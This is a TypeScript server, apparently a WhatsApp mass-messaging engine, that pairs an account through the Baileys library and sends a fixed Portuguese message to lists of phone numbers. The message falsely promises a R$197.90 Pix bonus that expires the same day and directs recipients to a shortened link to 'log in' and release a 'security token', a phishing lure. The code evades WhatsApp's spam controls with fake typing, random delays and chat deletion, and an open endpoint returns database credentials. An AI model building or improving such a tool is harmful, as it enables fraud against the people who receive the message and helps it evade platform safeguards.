import "dotenv/config";
import fs from "fs";
import os from "os";
import path from "path";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client.ts";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

// Usando um diretório temporário único para evitar conflitos de permissão
const AUTH_DIR = path.join(os.tmpdir(), `wa_session_${Date.now()}`);

function ensureAuthDir() {
  const fs = require('fs');
  if (!fs.existsSync("/tmp/auth_info_baileys")) {
    fs.mkdirSync("/tmp/auth_info_baileys", { recursive: true });
  }
}

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";
let lastError: string | null = null;

// ──────────────────────────────────────────────────────────
// Conexão principal com o WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp(): Promise<WASocket> {
  ensureAuthDir();
  const { state, saveCreds } = await useMultiFileAuthState("/tmp/auth_info_baileys");

  // Versão fixa e estável para evitar requisições externas lentas
  const version: any = [2, 3000, 1015901307];

  sock = makeWASocket({
    version,
    logger: logger as any,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger as any),
    },
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0, // Desativa timeout de query para evitar interrupções
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: false,
    syncFullHistory: false,
    markOnlineOnConnect: false,
  });

  sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      connectionStatus = "close";

      if (shouldReconnect) {
        console.log("Tentando reconectar...");
        setTimeout(() => connectToWhatsApp().catch(() => {}), 5000);
      }
    } else if (connection === "open") {
      connectionStatus = "open";
      pairingCode = null;
      console.log("✅ Conectado!");
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// ──────────────────────────────────────────────────────────
// Webhook de retorno de disparos
// ──────────────────────────────────────────────────────────
async function triggerWebhook(status: string, target: string, messageId: string): Promise<void> {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    await axios.post(webhookUrl, {
      status,
      target,
      messageId,
      timestamp: new Date().toISOString(),
      reward: 0.1,
    });
} catch (err: any) {
  console.error("Erro Webhook:", err);
}
}

// ──────────────────────────────────────────────────────────
// LÓGICA DE NEGÓCIO DOS ENDPOINTS
// ──────────────────────────────────────────────────────────

async function handleConnectService(phone: string) {
  if (!phone) throw new Error("Telefone obrigatório");
  const cleanPhone = phone.replace(/\D/g, "");

  // Reset completo para cada nova tentativa de conexão
  if (sock) {
    try { sock.end(undefined); } catch {}
    sock = null;
  }

  connectionStatus = "connecting";
  
  // Inicia conexão
  const socket = await connectToWhatsApp();

  // Espera ativa com timeout curto mas agressivo
  let attempts = 0;
  while (!socket.ws || (socket.ws as any).readyState !== 1) {
    if (attempts > 15) throw new Error("Falha na rede. Tente novamente.");
    await new Promise(r => setTimeout(r, 500));
    attempts++;
  }

  try {
    lastError = null;
    // Solicita o código IMEDIATAMENTE após o socket abrir
    const code = await socket.requestPairingCode(cleanPhone);
    if (!code) throw new Error("WhatsApp não retornou código");
    
    pairingCode = code;
    connectionStatus = "pairing";
    return { pairingCode: code };
} catch (err: any) {
  lastError = err.message || String(err);

  console.error("========== ERRO PAIRING ==========");
  console.error(err);
  console.error(err?.stack);
  console.error("==================================");

  throw err;
  }
}

async function handleDisconnectService() {
  if (sock) {
    try { await sock.logout(); sock.end(undefined); } catch {}
    sock = null;
  }
  connectionStatus = "close";
  pairingCode = null;
  return { success: true };
}

function startDisparoBackground(targets: unknown[]) {
  if (!sock || connectionStatus !== "open") throw new Error("WhatsApp não conectado");
  if (!Array.isArray(targets) || targets.length === 0) throw new Error("Lista inválida");

  (async () => {
    for (const targetRaw of targets) {
      try {
        const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";
        await sock?.sendPresenceUpdate("composing", target);
        await delay(Math.random() * 5000 + 5000);
        const sentMsg = await sock?.sendMessage(target, { text: FIXED_MESSAGE });
        if (sentMsg) {
          await triggerWebhook("success", target, sentMsg.key.id ?? "");
          // Opcional: deletar chat para antiban
          try { await sock?.chatModify({ delete: true, lastMessages: [{ key: sentMsg.key, messageTimestamp: sentMsg.messageTimestamp ?? 0 }] }, target); } catch {}
        }
        await delay(Math.random() * 15000 + 30000);
      } catch (err) {
        console.error(`Erro envio ${targetRaw}:`, err);
      }
    }
  })();

  return { status: "queueing", count: targets.length };
}

// ──────────────────────────────────────────────────────────
// Handler Web Request para integração com src/server.ts
// ──────────────────────────────────────────────────────────
function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
},
  });
}

export async function handleWhatsappApiRequest(request: Request): Promise<Response | null> {
  const url = new URL(request.url || "/", "http://localhost");
  let pathname = url.pathname;
  if (pathname.startsWith("/api/wa")) pathname = pathname.replace(/^\/api\/wa/, "/api");
  if (!pathname.startsWith("/api")) return null;

  if (request.method === "OPTIONS") {
  return new Response(null, {
    status: 204,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}

try {
    if (pathname === "/api/status" && request.method === "GET") {
      return jsonResponse({ 
        status: connectionStatus, 
        pairingCode, 
        lastError,
        connectedAs: sock?.authState?.creds?.me?.id ?? null 
      });
    }

    if (pathname === "/api/connect" && request.method === "POST") {
      const body = (await request.json()) as { phone?: string };
      const result = await handleConnectService(body.phone ?? "");
      return jsonResponse(result);
    }

    if (pathname === "/api/disconnect" && request.method === "POST") {
      return jsonResponse(await handleDisconnectService());
    }

    if (pathname === "/api/disparar" && request.method === "POST") {
      const body = (await request.json()) as { targets?: unknown[] };
      return jsonResponse(startDisparoBackground(body.targets ?? []));
    }

    if (pathname === "/api/contatos" && request.method === "GET") {
      return jsonResponse(await getContactsFromDB());
    }

    if (pathname === "/api/contatos/importar" && request.method === "POST") {
      const body = (await request.json()) as { phones?: string[] };
      return jsonResponse(await importContacts(body.phones ?? []));
    }

    if (pathname === "/api/db-credentials" && request.method === "GET") {
      return jsonResponse(getDBCredentials());
    }

    return null;
  } catch (error: any) {
    return jsonResponse({ error: error.message }, 500);
  }
}
import { createServer } from "http";

const PORT = process.env.PORT || 3000;

const server = createServer(async (req, res) => {
  const host = req.headers.host ?? "localhost";
  const url = new URL(req.url ?? "/", `http://${host}`);

  const headers: Record<string, string> = {};
  for (const [k, v] of Object.entries(req.headers)) {
    if (typeof v === "string") headers[k] = v;
    else if (Array.isArray(v)) headers[k] = v.join(", ");
  }

  let body: string | undefined;

  if (req.method !== "GET" && req.method !== "HEAD") {
    body = await new Promise<string>((resolve, reject) => {
      const chunks: Buffer[] = [];
      req.on("data", (c) => chunks.push(Buffer.from(c)));
      req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
      req.on("error", reject);
    });
  }

  const request = new Request(url.toString(), {
    method: req.method,
    headers,
    body,
  });

  const response = await handleWhatsappApiRequest(request);

  if (!response) {
    res.statusCode = 404;
    res.end("Não encontrado");
    return;
  }

  res.statusCode = response.status;
  response.headers.forEach((value, key) => res.setHeader(key, value));
  res.end(await response.text());
});

server.listen(Number(PORT), "0.0.0.0", () => {
  console.log(`Motor de disparo ativo na porta ${PORT}`);
});
